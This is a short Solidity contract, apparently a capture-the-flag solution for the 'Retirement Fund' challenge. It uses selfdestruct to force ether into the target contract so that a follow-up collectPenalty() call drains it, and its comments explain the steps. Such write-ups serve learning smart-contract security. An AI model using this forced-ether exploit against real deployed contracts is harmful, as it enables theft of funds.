pragma solidity 0.8.7;

/**
 * @notice Attacking is done by increase the balance of victim contract(RetirementFundChallenge) 
 * @notice After calling this attack function you have to call collectPenalty() function in victim contract directly 
 * @dev use At Address for loafing existing contract
 * 
*/
contract RetirementFundChallengeHack {

    function attack(address payable _rfcAddress) public payable{
        require(msg.value >= 1,"not enough money");
        selfdestruct(_rfcAddress);
    }

    receive() external payable{}
}